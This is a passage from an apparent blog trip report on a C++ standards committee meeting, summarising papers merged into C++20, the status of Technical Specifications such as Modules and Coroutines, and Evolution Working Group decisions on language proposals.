</a><li><a href="http://wg21.link/p1330"></a><a href="http://wg21.link/p0482"><code>char8_t</code>: a type for UTF-8 characters and strings.</a></li><a href="http://wg21.link/p0482">
</a><li><a href="http://wg21.link/p0482"></a><a href="http://wg21.link/p1289">Access control in contract conditions</a>.</li>
<li><a href="http://wg21.link/p0668">Revising the C++ memory model</a>. I‚Äôm not very familiar with this topic, but concurrency experts tell me this is long in the making and a rather important change.</li>
<li><a href="http://wg21.link/p0982">Weakening release sequences</a>.</li>
<li><a href="http://wg21.link/p1094">Nested inline namespaces</a></li><a href="http://wg21.link/p1094">
</a><li><a href="http://wg21.link/p1094"></a><a href="http://wg21.link/p1236">Signed integers are two‚Äôs complement</a></li>
</ul>
</li>
<li>Library:
<ul>
<li>The most notable addition at this meeting was <strong>merging the <a href="http://wg21.link/p0896">Ranges TS</a> into C++20</strong>!</li>
<li><a href="http://wg21.link/p0487">Fixing <code>operator&gt;&gt;(basic_istream&amp;, CharT*)</code>.<br />
      </a></li>
<li><a href="http://wg21.link/p0602"><code>variant</code> and <code>optional</code> should propagate copy/move triviality.<br />
      </a></li>
<li><a href="http://wg21.link/p0655"><code>visit&lt;R&gt;</code>: explicit return type for <code>visit</code>.<br />
      </a></li>
<li><a href="http://wg21.link/p0972"><code>&lt;chrono&gt;</code> <code>zero()</code>, <code>min()</code>, and <code>max()</code> should be <code>noexcept</code>.<br />
      </a></li>
<li><a href="http://wg21.link/p1006"><code>constexpr</code> in <code>std::pointer_traits</code>.<br />
      </a></li>
<li><a href="http://wg21.link/p1032">Miscellaneous <code>constexpr</code> bits.<br />
      </a></li>
<li><a href="http://wg21.link/p0318"><code>unwrap_ref_decay</code> and <code>unwrap_reference</code><br />
      </a></li>
<li><a href="http://wg21.link/p0357"><code>reference_wrapper</code> for incomplete types<br />
      </a></li>
<li><a href="http://wg21.link/p0608">A sane <code>variant</code> converting constructor<br />
      </a></li>
<li><a href="http://wg21.link/p0771"><code>std::function</code> move constructor should be <code>noexcept</code><br />
      </a></li>
<li><a href="http://wg21.link/p1007"><code>std::assume_aligned</code><br />
      </a></li>
<li><a href="http://wg21.link/p1020">Smart pointer creation with default initialization<br />
      </a></li>
<li><a href="http://wg21.link/p1285">Improving completeness requirements for type traits)<br />
      </a></li>
<li><a href="http://wg21.link/p1248">Remove <code>CommonReference</code> requirement from <code>StrictWeakOrdering</code> (a.k.a fixing relations)<br />
      </a></li>
<li><a href="http://wg21.link/p0591">Utility functions to implement uses-allocator construction<br />
      </a></li>
<li><a href="http://wg21.link/p1085">Should <code>span</code> be <code>Regular</code>?<br />
      </a></li>
<li><a href="http://wg21.link/p1165">Make stateful allocator propagation more consistent for <code>operator+(basic_string))</code><br />
      </a></li>
<li><a href="http://wg21.link/p0356">Simplified partial function application<br />
      </a></li>
<li><a href="http://wg21.link/p0919">Heterogeneous lookup for unordered containers<br />
      </a></li>
<li><a href="http://wg21.link/p1209">Adopt consistent container erasure from Library Fundamentals v2</a></li>
</ul>
</li>
</ul>
<h3 id="ts"><strong>Technical Specifications</strong></h3>
<p>In addition to the C++ International Standard (IS), the committee publishes <strong>Technical Specifications</strong> (TS) which can be thought of experimental ‚Äúfeature branches‚Äù, where provisional specifications for new language or library features are published and the C++ community is invited to try them out and provide feedback before final standardization.</p>
<p>At this meeting, the committee iterated on a number of TSes under development.</p>
<h4 id="reflection"><strong>Reflection TS</strong></h4>
<p>The <a href="http://wg21.link/n4766">Reflection TS</a> was sent out for its PDTS ballot at the last meeting. As described in previous reports, this is a process where a draft specification is circulated to national standards bodies, who have an opportunity to provide feedback on it. The committee can then make revisions based on the feedback, prior to final publication.</p>
<p>The PDTS ballot is still ongoing, so there wasn‚Äôt much to do on this front at this meeting. We expect the ballot results to be ready by the next meeting (February 2019, in Kona), at which time we‚Äôll address the ballot comments and, time permitting, approve the revised TS for publication.</p>
<p>One minor snafu discovered at this meeting is that prior to the PDTS ballot, the Reflection TS, which depends on Concepts, has been rebased onto C++20, to take advantage of C++20 Concepts (previously, it was based on the Concepts TS). Unfortunately, ISO rules don‚Äôt allow publishing a TS before its base document is published, which means that to publish the Reflection TS as-is, we‚Äôd have to wait to do it concurrently with the C++20 publication in late 2020. We very much don‚Äôt want to wait that long, since the purpose of the Reflection TS is to gather feedback from users in preparation for revised Reflection features in C++23, and the earlier we start getting that feedback, the better. So, we‚Äôll have to <em>un-rebase</em> the Reflection TS onto {C++17 + Concepts TS} to be able to publish it in early 2019 as planned. Isn‚Äôt red tape fun?</p>
<h4 id="lfts"><strong>Library Fundamentals TS v3</strong></h4>
<p>This <strong>third iteration (v3) of the Library Fundamentals TS</strong> is open for new features to  be added. (The TS working draft currently contains features from v2 which haven‚Äôt been merged into the C++ IS yet.) The only changes voted in at this meeting were a <a href="http://wg21.link/p1210">rebase</a> and some <a href="http://wg21.link/p1224">issue resolutions</a>, but a number of new features are <a href="http://botondballo.wordpress.com/tag/mozilla/feed/#library">on the way</a>.</p>
<h4 id="executors"><strong><s>Executors</s></strong></h4>
<p>As discussed <a href="http://botondballo.wordpress.com/tag/mozilla/feed/#concurrency">below</a>, the revised plans for Executors are for a subset of them to target C++20, and the rest C++23. An Executors TS is not planned at this time.</p>
<h4><strong>Merging Technical Specifications into C++20</strong></h4>
<p>Turning now to Technical Specifications that have already been published, but not yet merged into the IS, the C++ community is eager to see some of these merge into C++20, thereby officially standardizing the features they contain. </p>
<h5><strong>Ranges TS</strong></h5>
<p>The <strong>Ranges TS</strong> modernizes and Conceptifies significant parts of the standard library (the parts related to algorithms and iterators), as well as introducing exciting new features such as <strong>range views</strong>.</p>
<p>After years of hard work developing these features and going through the TS process, the Ranges TS was finally <strong>merged into C++20</strong>, paving the way for wider adoption of these features.</p>
<h5><strong>Concepts TS</strong></h5>
<p>The approval of <strong><a href="http://wg21.link/p1141">abbreviated function templates</a></strong> for C++20 at this meeting can be thought of as completing the merge of the Concepts TS into C++20: all the major features in the TS have now been merged, with some design modifications inspired by implementer and user feedback.</p>
<p>While the journey took longer than was initially hoped, in my opinion Concepts is a better feature for the design changes made relative to the Concepts TS, and as such this is an example of the TS process working as intended.</p>
<h5 id="modules-overview"><strong>Modules TS</strong></h5>
<p><strong>Modules</strong> remains one of the most highly anticipated features by the C++ user community. This meeting saw really good progress on Modules: a <a href="http://wg21.link/p1103">‚Äúmerged‚Äù Modules design</a>, combining aspects of the Modules TS and the alternative <a href="http://wg21.link/p0947">Atom proposal</a>, gained design approval <strong>for C++20</strong>.</p>
<p>This outcome exceeded expectations in that previously, the merged proposal seemed more likely to target a Modules TS v2 or C++23, with a <em>subset</em> possibly targeting C++20; however, thanks in significant part to the special one-off Modules-focused Bellevue meeting in September, good enough progress was made on the merged design that the authors were comfortable proposing putting the entire thing into C++20, which EWG subsequently approved.</p>
<p>As this is a large proposal, wording review by the Core Working Group will take some time, and as such, a plenary vote to merge the reviewed wording into the C++20 working draft won‚Äôt take place until the next meeting or the one after; however, as all the major compiler implementers seem to be on board with this design, and there is overwhelming demand for the feature from the user community, I expect smooth sailing for that vote.</p>
<p>In fewer words: <strong>Modules is on track for C++20</strong>!</p>
<h5 id="coroutines-overview"><strong>Coroutines TS</strong></h5>
<p>The <a href="http://wg21.link/p0912r3">Coroutines TS</a> was once again <a href="http://wg21.link/p0912r3">proposed for merger</a> into C++20 at this meeting. This is the third time this proposal was made (the other two times being at the previous two meetings). At the last meeting, the proposal got as far as a plenary vote at the end of the week, which narrowly failed.</p>
<p>The opposition to merging the TS into C++20 comes from the fact that a number of people have concerns about the Coroutines TS design (some of them are summarized <a href="http://wg21.link/p0973">in this paper</a>), and an <a href="http://wg21.link/p1063">alternative proposal</a> that addresses these concerns (called ‚ÄúCore Coroutines‚Äù) is under active development. Unfortunately, Core Coroutines is not sufficiently-baked to make C++20, so going with it would mean delaying Coroutines until C++23. Opinions differ on whether this is a worthwhile tradeoff: the Core Coroutines authors are of the view that C++ will remain a relevant language for 50 years or more, and waiting 3 years to improve a feature‚Äôs design is worthwhile; others have made it clear that they want Coroutines yesterday.</p>
<p>After the failure of last meeting‚Äôs merger proposal, it was hoped that waiting one more meeting would allow for the Core Coroutines proposal to mature a bit. While we knew it wouldn‚Äôt be ready for C++20, we figured the added maturity would allow us to better understand what we would be giving up by merging the Coroutines TS into C++20, and possibly identify changes we could make the Coroutines TS before C++20‚Äôs publication that would make incremental improvements inspired by Core Coroutines backwards-compatible, thereby allowing us to make a more informed decision on the C++20 merger.</p>
<p>Core Coroutines did make significant progress since the last meeting: the updated proposal is simpler, more fleshed out, and has a cleaner syntax. The impasse has also inspired efforts, <a href="http://wg21.link/p1241r0">led by Facebook</a>, to combine the two proposals in such a way that would unblock the merger into C++20, and allow for backwards-comaptible improvements achieving many of the goals of Core Coroutines in C++23, but these efforts are at a relatively early stage (a paper <a href="http://wg21.link/p1342">describing the combined design in detail</a> was circulated for the first time while the meeting was underway).</p>
<p>Ultimately, waiting a meeting doesn‚Äôt seem to have changed many people‚Äôs minds, and we saw a replay of what happened in Rapperswil: EWG narrowly passed the merger, and plenary narrowly rejected it; interestingly, the level of consensus in plenary appears to have <em>decreased</em> slightly since Rapperswil.</p>
<p>To keep C++20 on schedule, the final deadline for approving a TS merger is the next meeting, at Kona. The merger will undoubtedly be re-proposed then, and there remains some optimism that further development of Facebook‚Äôs combined proposal might allow us to gain the required confidence in a future evolution path to approve the merger for C++20; otherwise, we‚Äôre looking at getting Coroutines in C++23.</p>
<h5><strong>Networking TS</strong></h5>
<p>It‚Äôs looking like the <a href="http://wg21.link/n4771"><strong>Networking TS</strong></a> will not be merged into C++20, in large part due to the concerns presented <a href="http://wg21.link/p1269">this paper discussing usage experience</a>. The TS will instead target C++23.</p>
<h3 id="ewg"><strong>Evolution Working Group</strong></h3>
<p>With the increased number of subgroups meeting in parallel, it‚Äôs becoming more challenging to follow what goes on in the committee.</p>
<p>I usually sit in EWG for the duration of the meeting, and summarize the design discussions that take place in that group. I will try to do so again, but I did miss some EWG time while sitting in some study group meetings and Evolution Incubator meetings, so expect some reduction in the amount of detail. If you have specific questions that I didn‚Äôt cover, feel free to ask in the comments.</p>
<p>This time, I‚Äôll categorize proposals by topic. For your convenience, I still indicate whether each proposal was approved, had further work on it encouraged, or rejected. Proposals are targeting C++20 unless otherwise mentioned.</p>
<h4 id="concepts"><strong>Concepts</strong></h4>
<p>The headline item here is the approval of the <a href="http://wg21.link/p1141r1"><strong>compromise design for abbreviated function templates (AFTs)</strong></a>. With this syntax, AFTs look like this:</p>
<p><code>void f(Concept auto x);</code></p>
<p>This makes both the ‚ÄúI want to write a function template without the <code>template&lt;...&gt;</code> notation‚Äù and the ‚ÄúI want to be able to tell syntactically if a function is a template‚Äù camps happy (the latter because the <code>auto</code> tells you the parameter has a deduced type, and therefore the function is a template).</p>
<p>You can also use <code>Concept auto</code> as a return type, and as the type of a variable. In each case, the type is deduced, and the deduced type has to satisy the concept. The paper as written would have allowed the return type and variable cases to omit the <code>auto</code>, but this didn‚Äôt have consensus and was removed.</p>
<p>Note that you can write just <code>void f(auto x);</code> as well, making functions consistent with lambdas which could already do this.</p>
<p>Finally, as part of this change, a restriction was imposed on the <code>template &lt;Concept T&gt;</code> notation, that <code>T</code> has to be a type. For non-type and template template parameters, constraints can only be specified using a <em>requires-clause</em>. The motivation here is to be able to tell syntactically what type of entity <code>T</code> is.</p>
<p>A few other Concepts-related proposals were looked at:</p>
<ul>
<li><strong>(Further work)</strong> <a href="http://wg21.link/p1168r0">How to make terse notation soar with class template argument deduction</a>. The idea here is to combine class template argument deduction (CTAD) and Concepts such that a class template name (e.g. <code>tuple</code>) can be used as a parameter type as if it were a concept (with the concept being, roughly, ‚Äúthis type is a specialization of <code>tuple</code>‚Äú). The proposal was generally well-received, but there are some technical details to iron out, and design alternatives to consider (e.g. spelling it <code>tuple&lt;auto...&gt;</code>), so this will be revisited for C++23.</li>
<li><strong>(Rejected)</strong> <a href="http://wg21.link/p1199r0">A simple proposal for unifying generic and object-oriented programming</a>. This is a more ambitious proposal to try to allow writing code that works with a set of polymorphic types, that looks the same regardless of whether the polymorphism is dynamic (inheritance) or static (concepts). Reception was mixed; some felt this would introduce a new programming model with relatively little benefit.</li>
<li><strong>(Rejected)</strong> <a href="http://wg21.link/p1158r0">Concept-defined placeholder types</a>. This would have allowed defining a ‚Äúplaceholder type‚Äù constained by a concept, and using that type in place of the concept. It didn‚Äôt really fit with the AFT design that was approved.</li>
<li><strong>(Rejected)</strong> <a href="http://wg21.link/p1157r0">Multi-argument constrained parameter</a>. This proposed a whitespace-based syntax for introducing multiple constrained parameters in a template parameter list, e.g. <code>template &lt;EqualityComparableWith T U&gt;</code>. EWG didn‚Äôt feel the whitespace syntax was an improvement over other syntaxes that have been rejected, like <code>template &lt;EqualityComparableWith{T, U}&gt;.</code></li>
</ul>
<p>EWG ran out of time to review the updated <a href="http://wg21.link/p0782r2">‚Äúconstraining Concepts overload sets‚Äù</a> proposal. However, there was some informal speculation that the chances of this proposal making C++20 have diminished, because the proposal has grown a lot more complex in an attempt to address EWG‚Äôs feedback on the previous version, which suggests that feedback had touched on some hard problems that we may not be in a good position to solve at this time.</p>
<h4 id="modules"><strong>Modules</strong></h4>
<p>As mentioned, perhaps the biggest high-point of this meeting was <strong>EWG‚Äôs approval of the <a href="http://wg21.link/p1103">merged Modules design</a></strong> for C++20. ‚ÄúMerged‚Äù here refers to the proposal combining aspects of the Modules TS design, and the alternative <a href="http://wg21.link/p0947">Atom proposal</a>. Perhaps most significantly, the design borrows the Atom proposal‚Äôs <strong>legacy header imports</strong> feature, which is intended to better facilitate incremental transition of existing large codebases to Modules.</p>
<p>Several minor modifications to this design and related changes were also proposed:</p>
<ul>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p0924">Making <code>module</code> a context-sensitive keyword</a>, take two. Following consistent feedback from many segments of the user community that making <code>module</code> a hard keyword would break too much code, a new proposal for making it context-sensitive, this time with simpler disambiguation rules, was approved.</li>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1242">Single-file modules with the Atom semantic properties rule</a>. This allows module authors to do certain things that previously required separate module partitions in separate files, in one file.</li>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1299">Module preamble is unnecessarily fragile</a>. This tweaks the rules for where a module file‚Äôs ‚Äúpreamble‚Äù (the area containing the module declaration and imports) ends, with a view to making the user model simpler.</li>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1218">Redefinitions in legacy imports</a>. This clarifies some of the rules in scenarios involving legacy header imports.</li>
<li><strong>(Further work)</strong> <a href="http://wg21.link/p1212">Modules and freestanding</a>. This mostly has to do with how to split the standard library into modules, with the relevance to EWG being that we should have a consistent approach for dealing with <a href="http://botondballo.wordpress.com/tag/mozilla/feed/#freestanding">freestanding implementations</a> in the language and in the library. EWG did not reach a consensus on this topic, mostly because there are a wide variety of freestanding environments with different constraints, and a single subset of the language does not fit all of them.</li>
<li><strong>(Further work)</strong> <a href="http://wg21.link/p1303r0">Inline module partitions</a>. This is a generalization of ‚ÄúSingle-file modules with the Atom semantic properties rule‚Äù, which would allow defining an arbitirary number of module partitions ‚Äúinline‚Äù in a single file. EWG encouraged further development of this idea, but for post-C++20.</li>
<li><strong>(Rejected)</strong> <a href="http://wg21.link/p1213">Global module fragment is unnecessary</a>. The <em>global module fragment</em> is one of two mechanisms for transitioning existing code to Modules (the other being legacy header imports). The author of this paper suggested that just legacy header imports may be sufficient, but this was emphatically argued against based on implementation experience at some companies, leading to the proposal‚Äôs rejection.</li>
<li><strong>(Rejected)</strong> <a href="http://wg21.link/p0997">Retiring pernicious language constructs in module contexts</a>. This paper suggested that Modules was an opportunity to shed some of the language‚Äôs legacy cruft by making certain constructs invalid inside a module (while they would remain valid in non-modular code for backwards compatibility). There wasn‚Äôt much enthusiasm for this idea, largely because it‚Äôs expected that people will want to be able to freely copy / migrate code from a non-modular context to a modular context and vice versa.</li>
</ul>
<h4 id="contracts"><strong>Contracts</strong></h4>
<ul>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1289r0">Access control in contract conditions</a>. This was the subject of a very long and drawn-out debate on the committee mailing lists which I won‚Äôt attempt to summarize, but the outcome was that pre- and post-conditions on member functions can reference private and protected variables inside the class, even though we think of them as being part of the class‚Äôs public interface.</li>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1323r0">Contract postconditions and return type deduction</a>. This is a tweak regarding the interaction between postconditions and return type deduction, with the intention to avoid surprising behaviour. Option 3 from the paper had consensus.</li>
<li><strong>(Further work)</strong> <a href="http://wg21.link/p1320r0">Allowing contract predicates on non-first declarations</a>. EWG was open to this idea, but some implementation issues (such as who emits the code for the contract check) need to be ironed out.</li>
<li><strong>(Further work)</strong> <a href="http://wg21.link/p1321r0">Undefined behaviour in contract violations</a>. This was another topic that engendered very extensive mailing list discussion. No decision was made this week, but the likely direction is to specify that contracts (except perhaps <code>axiom</code>s) do not allow compilers to assume additional things they couldn‚Äôt already assume.</li>
<li><strong>(Rejected)</strong> <a href="http://wg21.link/p1343">Contracts updates</a>. Of the three minor changes proposed in this paper, the first was a trivial wording change (which was approved); the second had no consensus; and the third was deemed unimplementable.</li>
</ul>
<h4 id="constexpr"><strong><code>constexpr</code></strong></h4>
<p>Continuing with the committee‚Äôs concerted effort to make clunkier forms of compile-time programming (such as template metaprogramming) unnecessary, EWG approved further extensions to <code>constexpr</code>:</p>
<ul>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1327r0">Allowing <code>dynamic_cast</code> and polymorphic <code>typeid</code> in constant expressions</a></li>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1328r0">Make <code>std::typeinfo::operator=</code> <code>constexpr</code></a></li>
<li><strong>(Approved)</strong> A tweak to <a href="http://wg21.link/p1073r2">immediate functions</a>. The keyword used to introduce them was changed from <code>constexpr!</code> to <code>consteval</code> because the former presented lexical concerns.</li>
<li><strong>(Further work)</strong> <a href="http://wg21.link/p1306r0">Expansion statements</a>. These can be thought of compile-time <code>for</code> loops; they were previously proposed as <a href="http://wg21.link/p0589r0">tuple-based <code>for</code> loops</a>. They‚Äôre called expansion statements because they are expanded (unrolled) at compile time, with the body of each ‚Äúiteration‚Äù potentially working with different types. The current proposal contains two forms, <code>for ...</code> and <code>for constexpr</code>, and EWG expressed a desire to unify them.</li>
</ul>
<h4 id="coroutines"><strong>Coroutines</strong></h4>
<p>I mentioned <a href="http://botondballo.wordpress.com/tag/mozilla/feed/#coroutines-overview">above</a> that EWG narrowly passed the latest version of a proposal to <a href="http://wg21.link/p0912r3">merge the Coroutines TS into C++20</a>, only to have it rejected in a plenary vote.</p>
<p>The technical discussion of this topic centred around an updated version of the competing <a href="http://wg21.link/p1063r1">Core Coroutines</a> proposal, and a <a href="http://wg21.link/p1241r0">paper by Facebook engineers</a> arguing that most of the benefits of Core Coroutines could be achieved through extensions to the Coroutines TS, and we should therefore go ahead with the Coroutines TS in C++20.</p>
<p>An interesting development that emerged mid-meeting is the Facebook folks coming up with a <a href="http://wg21.link/p1342">‚Äúunified coroutines‚Äù</a> proposal that aims to achieve consensus by combining aspects of the two competing proposals. There wasn‚Äôt really enough time for the committee to digest this proposal, but we are all hopeful it will help us make an informed final decision (final for C++20, that is) at the next meeting.</p>
<h4 id="structured-bindings"><strong>Structured Bindings</strong></h4>
<ul>
<li><strong>(Approved in part)</strong> <a href="http://wg21.link/p1091r0">Extend structured bindings to be more like variable declarations</a>. Structured bindings can now be <code>static</code>, <code>thread_local</code>, or <code>constexpr</code>; in each case, this applies to the entire composite object being destructured. Rules around linkage were also clarified. Capture of bindings by a lambda was deferred for further work.</li>
<li><strong>(Further work)</strong> <a href="http://wg21.link/p1096r0">Simplify the customization point for structured bindings</a>. EWG wholehearted wants an overhaul of the customization point (the current one just piggybacks on the customization point for <em>tuple-like</em> that we already had in the language), but felt this proposal addressed just one piece of what is a larger puzzle. A more complete proposal may look something like the <code>operator extract</code> from an earlier <a href="http://wg21.link/p0095r1">pattern matching</a> proposal.</li>
<li><strong>(Rejected)</strong> <a href="http://wg21.link/p0480r1">Structured bindings with explicit types</a>. This was rejected because the use cases will be addressed more comprehensively with pattern matching.</li>
</ul>
<h4 id="ctad"><strong>Class Template Argument Deduction (CTAD)</strong></h4>
<ul>
<li><strong>(Approved in part)</strong> <a href="http://wg21.link/p1021r1">Filling holes in class template argument deduction</a>. CTAD now works with aggregates, alias templates, and inheriting constructors. Making CTAD work with partial template argument lists was rejected because it would be a breaking change in some cases (e.g. consider <code>vector&lt;any&gt;(MyAlloc())</code>).</li>
<li><strong>(Rejected)</strong> <a href="http://wg21.link/p1167r0">Improving function templates with CTAD</a>. EWG found that this would involve a lot of complexity, since with function templates you don‚Äôt just have one template definition as with class templates, but a whole overload set.</li>
</ul>
<h4 id="comparisons"><strong>Comparisons</strong></h4>
<p>Most comparison-related proposals involved early adopters trying out the spaceship operator (<code>&lt;=&gt;</code>) and discovering problems with it.</p>
<ul>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1190r0">I did not order this! Why is it on my bill?</a>, which probably deserves a medal of some sort for most creative paper title. (Explanation: the paper concerns scenarios where you don‚Äôt care about <em>ordering</em> your type, only equality-comparing it, you implement a defaulted <code>operator&lt;=&gt;</code> (because that‚Äôs ‚Äúthe C++20 way‚Äù for all comparison use cases), and you pay a performance penalty that wouldn‚Äôt be there with hand-written code to deal with equality comparison only.) A <a href="http://wg21.link/p1185r0">related paper</a> offers a solution, which is along the lines of making <code>==</code> be its own thing and not fall back to using <code>&lt;=&gt;</code>, since that‚Äôs where the inefficiency stems from (for types like <code>string</code>, if the lengths are different you can answer ‚Äúnot equal‚Äù much faster than if you‚Äôd have to answer ‚Äúless‚Äù or ‚Äúgreater than‚Äù). A second part of the proposal, where a defaulted <code>&lt;=&gt;</code> would <em>also</em> generate a defaulted <code>==</code>, so that users can be largely oblivious to this problem and just default one operator (<code>&lt;=&gt;</code>), was more controversial, but was still approved over some objections.</li>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1186r0">When do you actually use <code>&lt;=&gt;</code>?</a> The crux of this paper is that we‚Äôve had to invent a library function <code>compare_3way()</code> wrapping <code>&lt;=&gt;</code> and that‚Äôs what we want to use most of the time, so we should just give <code>&lt;=&gt;</code> the semantics of that function.</li>
<li><strong>(Mooted)</strong> <a href="http://wg21.link/p1307r0"><code>weak_equality</code> considered harmful</a>. This proposal has become moot as implementations of <code>==</code> are no longer generated in terms of <code>&lt;=&gt;</code>. (As a result, <code>weak_equality</code> and <code>strong_equality</code> are no longer used and will likely be removed in the future.)</li>
<li><strong>(Rejected)</strong> <a href="http://wg21.link/p0893r1">Chaining comparisons</a>. Despite previous encouragement, this was now rejected due to concerns about teachability and implementation issues.</li>
</ul>
<h4><strong>Other New Features</strong></h4>
<ul>
<li><strong>(Further work)</strong> <a href="http://wg21.link/p0847r1">Deducing <code>this</code></a>. This proposal allows writing member functions where the type of <code>this</code> is deduced, thereby eliminating the need to duplicate implementations for things like <code>const</code> vs. non-<code>const</code> objects, and other sources of pain. There was a fair amount of technical discussion concerning recursive lambdas (which this proposal hopes to enable), name lookup rules, and other semantic details. The authors will return with a revised proposal.</li>
<li><strong>(Rejected)</strong> <a href="http://wg21.link/p0927r2">Towards a lazy forwarding mechanism for C++</a>. This would allow declaring function parameters to be ‚Äúlazy‚Äù, such that their arguments are evaluated upon their use inside the function (and possibly not at all if there is no use), rather than at the call site; participants pointed out a similarity to Algol‚Äôs ‚Äúcall by name‚Äù feature. EWG wasn‚Äôt categorically opposed to the notion of lazy parameters, but the notion of having them without any call-site syntax (like this paper proposes) was controversial.</li>
</ul>
<h4 id="bugfixes"><strong>Bug / Consistency Fixes</strong></h4>
<p>(Disclaimer: don‚Äôt read too much into the categorization here. One person‚Äôs bug fix is another‚Äôs feature.)</p>
<ul>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p0960">Allow initializing aggregates from a parenthesized list of values</a>. This finally allows things like <code>vector::emplace_back()</code> to work for aggregates.</li>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1286r0">Contra CWG DR1778</a>. This has to do with <code>noexcept</code> and explicitly defaulted functions. The first option from the paper was approved.</li>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p0388r3">Permit conversions to arrays of unknown bound</a>. The motivation cited for this is working in environments where dynamic allocation is not allowed and use of pointers is restricted, and thus passing around variable-length arrays as arrays of unknown bound are the only way to work with dynamically sized data ranges.</li>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1009">Array size deduction in new-expressions</a>. This is a minor consistency fix that was also approved as a Defect Report against older language versions.</li>
<li><strong>(Approved)</strong> <a href="http://wg21.link/p1094r1">Nested inline namespaces</a>. This allows using the C++17 nested namespace syntax in cases where one or more of the namespaces are inline. Example: <code>namespace foo::inline bar::baz { }</code> is short for <code>namespace foo { inline namespace bar { namespace baz {  }}}</code>. <code>inline</code> is not allowed in the leading position as people might mistakenly think it applies to the innermost namespace.</li>
<li><strong>(Further work)</strong> <a href="http://wg21.link/p0848r0">Conditionally trivial special member functions</a>. This is a small but important fix for library implementers who would otherwise have to use labour-intensive techniques to meet the triviality requirements set out for standard library types. This was essentially approved, but specification difficulties necessitate one more round of review.</li>
<li><strong>(Further work)</strong> <a href="http://wg21.link/p0889r0">Ultimate copy elision</a>. This aims to expand the set of scenarios in which the compiler is allowed to elide copies and moves (note: unlike the C++17 ‚Äúguaranteed copy elision‚Äù feature, this is not <em>requiring</em> compilers to elide copies in these new scenarios, just <em>allowing</em> them). EWG liked the general idea but had concerns about the potential for code breakage in some scenarios.</li>
<li><strong>(Further work)</strong> <a href="http://wg21.link/p1143r0">Adding the <code>[[constinit]]</code> attribute</a>. The motivation here is cases where you want to guarantee that a variable‚Äôs <em>initial value</em> is computed at compile time (so no dynamic initialization required), without making the variable <code>const</code> (so that you can assign new values to it at runtime). EWG liked the idea but preferred using a keyword rather than an attribute. An alternative to decorate the initializer rather than the variable had no consensus.</li>
<li><strong>(Postponed)</strong> <a href="http://wg21.link/p0192r4"><code>short float</code></a>. This proposal continues to face challenges due to concerns about different implementations using different sizes for it, or even different representations within the same size (number of bits in mantissa vs. exponent). As a result, there was no consensus for moving forward with it for C++20. There remains strong interest in the topic, so I expect it will come back for C++23, possibly under a different name (such as <code>float16_t</code> instead of <code>short float</code>, to specify the size more concretely).</li>
<li><strong>(Rejected)</strong> <a href="http://wg21.link/p1305">Deprecate the addressof operator</a>. This proposes to deprecate the overloading of <code>operator &amp;</code>. EWG didn‚Äôt feel that removal was realistic given that we don‚Äôt have a good handle on the breadth of usage in the wild, and didn‚Äôt want to entertain deprecation without an intention to remove as a follow-up.</li>
</ul>
<h3 id="ewgi"><strong>Evolution Working Group Incubator</strong></h3>
<p>As mentioned above, due to the increased quantity of proposals, an ‚ÄúEWG Incubator‚Äù group (EWGI) was also spun up to do a preliminary round of review on some proposals that EWG couldn‚Äôt get to this week, in the hope of making them better-baked for their eventual EWG review at a future meeting.</p>
<p>I only attended EWGI for half a day, so I don‚Äôt have much to report about the discussions that went on, but I will list the papers the group forwarded to EWG:</p>
<ul>
<li><a href="http://wg21.link/p1041r1">Make <code>char16_t</code>/<code>char32_t</code> string literals be UTF-16/32</a></li>
<li><a href="http://wg21.link/p1097r1">Named character escapes</a></li>
<li><a href="http://wg21.link/p1099r2"><code>using enum</code></a></li>
<li><a href="http://wg21.link/p1301r0"><code>nodiscard</code> should have a reason</a></li>
</ul>
<p>There were also a couple of papers EWGI referred for EWG review not necessarily because they‚Äôre sufficiently baked, but because they would benefit from evaluation by a larger group:</p>
<ul>
<li><a href="http://wg21.link/p1203r0">Modular <code>main()</code></a></li>
<li><a href="http://wg21.link/p1040r2"><code>std::embed</code></a></li>
</ul>
<p>Numerous other proposals were asked to return to EWGI with revisions. I‚Äôll call out a couple:</p>
<ul>
<li>There were <a href="http://wg21.link/p1260r0">two</a> <a href="http://wg21.link/p1308r0">proposals</a> for <strong>pattern matching</strong>. The feature had strong support, and the authors were asked to return with a combined proposal.</li>
<li>There was <a href="http://wg21.link/p1229r0">another attempt at named arguments</a> (called ‚Äúlabelled parameters‚Äù in the proposal). The novelty in this approach was putting the names in the type system, but without actually modifying any semantic rules like overload resolution, by encoding the labels using existing mechanisms in the type system, and then layering a ‚Äúsugar‚Äù syntax on top. EWGI‚Äôs feedback was that the attempted abstraction will leak, and we‚Äôll have to end up making deeper modifications to the type system after all, to have a usable feature. Encouragement to return was weak but existent.</li>
</ul>
<h4><strong>Papers not discussed</strong></h4>
<p>There were, of course, also papers that neither EWG nor EWGI had the time to look at during this meeting; among them was Herb‚Äôs <strong><a href="http://wg21.link/p0709r0">static exceptions</a></strong> proposal, which is widely anticipated, but not targeting C++20.</p>
<p>I‚Äôll also briefly mention the <a href="http://wg21.link/p0936r0"><code>lifetimebound</code> proposal</a> which Mozillians have expressed a particular interest in due to the increased lifetime safety it would bring: the authors feel that Microsoft‚Äôs lifetime checker, whose model of operation is now <a href="http://wg21.link/p1179">described in a paper</a> is doing an adequate job of satisfying this use case outside of the core language rules (via annotations + a separate static checker). Microsoft‚Äôs lifetime checker ships with MSVC, and has a work-in-progress implementation in Clang as well, which can be tried out in <a href="https://cppx.godbolt.org/">Compiler Explorer</a>, and will hopefully be open-sourced soon. See also <a href="https://robert.ocallahan.org/2018/09/more-realistic-goals-for-c-lifetimes-10.html">Roc‚Äôs blog post</a> on this subject.</p>
<h3><strong>Other Working Groups</strong></h3>
<h4 id="library"><strong>Library Groups</strong></h4>
<p>Having sat in the Evolution groups, I haven‚Äôt been able to follow the Library groups in any amount of detail, but I‚Äôll call out some of the more notable library proposals that have gained design approval at this meeting: </p>
<ul>
